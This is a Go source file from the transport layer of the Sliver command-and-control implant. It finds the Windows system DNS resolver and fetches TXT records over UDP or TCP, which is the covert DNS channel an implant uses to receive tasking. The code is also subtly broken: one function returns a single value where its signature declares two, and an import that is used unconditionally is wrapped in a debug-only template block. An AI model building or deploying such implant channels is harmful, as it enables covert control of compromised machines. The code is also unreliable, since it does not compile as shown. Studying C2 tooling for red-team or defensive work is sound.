package transports

import (
	"context"
	"errors"

	// {{if .Debug}}
	"fmt"
	// {{end}}
	"log"
	"net"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/bishopfox/sliver/sliver/platform/win"
)

const (
	MEM_COMMIT  = 0x001000
	MEM_RESERVE = 0x002000
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func sysAlloc(size int) (uintptr, error) {
	n := uintptr(size)
	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, uintptr(syscall.PAGE_READWRITE))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func toUint32Ptr(x uint32) *uint32 {
	return &x
}

func getDNSResolver() (string, error) {

	size := toUint32Ptr(uint32(5000))
	addr, _ := sysAlloc(5000)
	info := (win.PFIXED_INFO)(unsafe.Pointer(addr))
	ret := win.GetNetworkParams(info, size)
	// {{if .Debug}}
	log.Printf("Ret = %d\n", ret)
	log.Printf("Info = %s\n", info.DnsServerList.IpAddress)
	// {{end}}
	if ret != 0 {
		return "", errors.New("Cannot determine system DNS settings")
	}
	ip := fmt.Sprintf("%s", info.DnsServerList.IpAddress)
	ip = ip[1:strings.Index(ip, "\x00")]
	return ip
}

func dnsLookup(domain string) (string, error) {
	resolverIP, _ := getDNSResolver()
	// {{if .Debug}}
	log.Printf("[dns] resolver ip: %#v", resolverIP)
	// {{end}}
	result, err := dnsUDPLookup(resolverIP, domain)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[dns] udp resolver failed with %s", err)
		log.Printf("[dns] attempting dns over tcp ...")
		// {{end}}
		result, err = dnsTCPLookup(resolverIP, domain)
	}
	return result, err
}

func dnsUDPLookup(resolverIP string, domain string) (string, error) {
	udpResolver := net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			dialer := net.Dialer{}
			return dialer.DialContext(ctx, "udp", fmt.Sprintf("%s:53", resolverIP))
		},
	}

	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := udpResolver.LookupTXT(ctx, domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil
}

func dnsTCPLookup(resolverIP string, domain string) (string, error) {
	tcpResolver := net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			dialer := net.Dialer{}
			return dialer.DialContext(ctx, "tcp", fmt.Sprintf("%s:53", resolverIP))
		},
	}

	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := tcpResolver.LookupTXT(ctx, domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil
}
